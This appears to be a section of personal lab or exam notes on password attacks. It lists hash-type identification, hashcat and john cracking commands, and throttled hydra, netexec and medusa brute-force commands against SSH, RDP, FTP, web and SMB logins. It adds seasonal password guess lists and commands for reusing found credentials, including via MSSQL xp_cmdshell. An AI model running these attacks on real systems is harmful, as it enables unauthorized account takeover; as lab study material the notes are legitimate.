# 06 — Password Attacks  (gentle, top-250, short-leash)

**Rule:** passwords are in the **top ~250 of rockyou** or **not crackable**. One user, 2–3 min max.
If it doesn't fall fast, it's **not the intended path** — go find another vector. No full-rockyou sprays.

## Step 1 — identify the hash
```bash
hashid '<hash>'                      # or:  hash-identifier
```
| Looks like | Type | hashcat `-m` | john format |
|-----------|------|-------------|-------------|
| 32 hex | MD5 | 0 | raw-md5 |
| 40 hex | SHA1 | 100 | raw-sha1 |
| 64 hex | SHA256 | 1400 | raw-sha256 |
| `$2a$`/`$2b$` | bcrypt | 3200 | bcrypt |
| `aad3b...:<32hex>` | NTLM | 1000 | nt |
| `$6$...` | sha512crypt (Linux shadow) | 1800 | sha512crypt |
| `$krb5tgs$` | Kerberoast | 13100 | krb5tgs |

## Step 2 — crack offline (preferred: silent, no target noise)
```bash
# hashcat (GPU):
hashcat -m <mode> -a 0 hash.txt wordlists/rockyou-top250.txt
hashcat -m <mode> -a 0 hash.txt wordlists/rockyou-top250.txt -r /usr/share/hashcat/rules/best64.rule
# john:
john --format=<fmt> --wordlist=wordlists/rockyou-top250.txt hash.txt
john --show --format=<fmt> hash.txt
# show result:
hashcat -m <mode> hash.txt --show
```
Non-GenAI web is allowed → **crackstation.net** for unsalted MD5/SHA (instant, offline-brain-free).

## Step 3 — online guessing (only if no hash; stay gentle `-t 1`)
```bash
# SSH:
hydra -l <user> -P wordlists/rockyou-top250.txt ssh://$RHOST -t 1 -W 1
# RDP (Tut10 Charlice — season/pattern passwords like Summer2026!):
hydra -l <user> -P wordlists/season-pattern.txt rdp://$RHOST -t 1
# FTP:
hydra -l <user> -P wordlists/rockyou-top250.txt ftp://$RHOST -t 1 -W 1
# HTTP POST login form:
hydra -l <user> -P wordlists/rockyou-top250.txt $RHOST http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 1 -W 1
# SMB / WinRM (netexec, one at a time):
nxc smb $RHOST   -u <user> -p wordlists/rockyou-top250.txt
nxc winrm $RHOST -u <user> -p wordlists/rockyou-top250.txt
# medusa alternative:
medusa -h $RHOST -u <user> -P wordlists/rockyou-top250.txt -M ssh -t 1
```
`-t 1` = one thread (gentle), `-W 1` = wait between tries. One username at a time.

## Pattern / season passwords (very common on these boxes)
Before rockyou, try the obvious human patterns — build `wordlists/season-pattern.txt`:
```
Summer2026!  Winter2026!  Spring2026!  Autumn2026!  Autumn2025!  Summer2025!
Password1!   Welcome1!    <Company>2026!   <Hostname>123!   Changeme1!
```
Also try: username = password, blank, `admin/admin`, product defaults, names from SMB/web notes.

## Found creds → where to use them
```
RDP:  xfreerdp /u:<u> /p:'<pass>' /v:$RHOST /cert:ignore +clipboard
WinRM: evil-winrm -i $RHOST -u <u> -p '<pass>'
SMB:  smbclient //$RHOST/<share> -U <u>%'<pass>'
SSH:  ssh <u>@$RHOST
MSSQL: sqsh -S $RHOST -U <u> -P '<pass>'      (-> xp_cmdshell, see 04 §5)
```

## Gotchas
- Offline cracking > online guessing — if you have a hash, crack it silently, don't hammer the box.
- **2–3 minutes, one user, top-250.** No result ⇒ wrong path. Don't get stuck here (time sink #1).
- Reuse creds everywhere (password reuse is the norm): one share note → RDP → WinRM → MSSQL.
- Build the trimmed wordlists with `setup.sh` (makes `rockyou-top250.txt` + `season-pattern.txt`).
